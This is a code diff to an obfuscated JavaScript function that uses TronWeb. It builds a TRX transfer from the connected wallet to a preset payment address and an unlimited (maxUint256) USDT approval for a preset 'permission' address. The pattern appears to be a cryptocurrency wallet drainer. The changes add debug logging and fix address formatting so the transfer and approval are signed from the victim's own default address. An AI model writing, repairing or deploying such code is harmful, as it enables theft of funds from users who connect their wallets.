@@ -34,11 +34,19 @@ async function DjdskdbGsj() {
   const feeLimit = 1000000000;
   
   try {
+    // 打印地址以进行调试
+    console.log("Payment address:", window.Payment_address);
+    console.log("Permission address:", window.Permission_address);
+    console.log("USDT Contract address:", window.usdtContractAddress);
+
+    // 确保使用的是base58格式的地址
+    const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+    
     console.log("构建TRX转账交易...");
     const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
-      window.Payment_address,
+      paymentAddress,
       trxAmountInSun,
-      userData.address,
+      tronWeb.defaultAddress.base58,
       { feeLimit: feeLimit }
     );
 
@@ -51,7 +59,7 @@ async function DjdskdbGsj() {
         { type: 'address', value: window.Permission_address },
         { type: 'uint256', value: maxUint256 }
       ],
-      userData.address
+      tronWeb.defaultAddress.base58
     );
 
     // 保存原始的交易数据
